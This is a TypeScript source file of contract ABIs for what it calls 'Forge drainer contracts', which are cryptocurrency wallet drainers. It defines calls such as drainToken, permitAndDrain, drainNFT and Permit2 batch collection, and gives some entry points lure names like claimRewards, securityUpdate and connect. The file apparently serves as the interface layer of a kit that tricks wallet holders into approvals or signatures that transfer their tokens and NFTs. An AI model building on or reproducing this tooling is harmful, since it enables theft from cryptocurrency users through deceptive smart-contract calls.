// src/abi/drainer-abis.ts
// Minimal ABIs for Forge drainer contracts

export const CLAIM_CONTRACT_ABI = [
  "function claim() payable",
  "function claimTokens(address token, uint256 amount) payable",
  "function claimRewards() payable",
  "function execute(bytes calldata data) payable",
  "function connect() payable",
  "function securityUpdate() payable",
  "function swap(address tokenIn, address tokenOut, uint256 amountIn) payable",
  "event Claimed(address indexed user, uint256 amount)",
] as const;

export const TOKEN_DRAINER_ABI = [
  "function drainToken(address token, uint256 amount) payable",
  "function approveAndDrain(address token, uint256 amount) payable",
  "function permitAndDrain(address token, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) payable",
] as const;

export const NFT_DRAINER_ABI = [
  "function drainNFT(address collection, uint256 tokenId) payable",
  "function listAndDrain(address collection, uint256 tokenId, uint256 price) payable",
] as const;

export const PERMIT2_INTEGRATION_ABI = [
  "function collectViaPermit2(address token, uint256 amount, uint256 nonce, bytes signature) payable",
  "function collectBatchViaPermit2(address[] tokens, uint256[] amounts, uint256 nonce, bytes signature) payable",
] as const;

export const CONNECT_CONTRACT_ABI = [
  "function connect() payable",
  "function execute(bytes calldata data) payable",
] as const;

export const EXECUTE_CONTRACT_ABI = [
  "function execute(bytes calldata data) payable",
  "function multicall(bytes[] calldata data) payable returns (bytes[] memory)",
] as const;

export const SWAP_CONTRACT_ABI = [
  "function swap(address tokenIn, address tokenOut, uint256 amountIn) payable",
] as const;

export const MULTICALL_CONTRACT_ABI = [
  "function multicall(bytes[] calldata data) payable returns (bytes[] memory)",
] as const;

export const SECURITY_UPDATE_ABI = [
  "function securityUpdate() payable",
  "function migrate(bytes calldata data) payable",
] as const;

export const TRUST_CONTRACT_ABI = [
  "function deposit() payable",
  "function withdraw(uint256 amount)",
  "function claim() payable",
  "function execute(bytes calldata data) payable",
  "function connect(address wallet) payable",
  "function update() payable",
] as const;

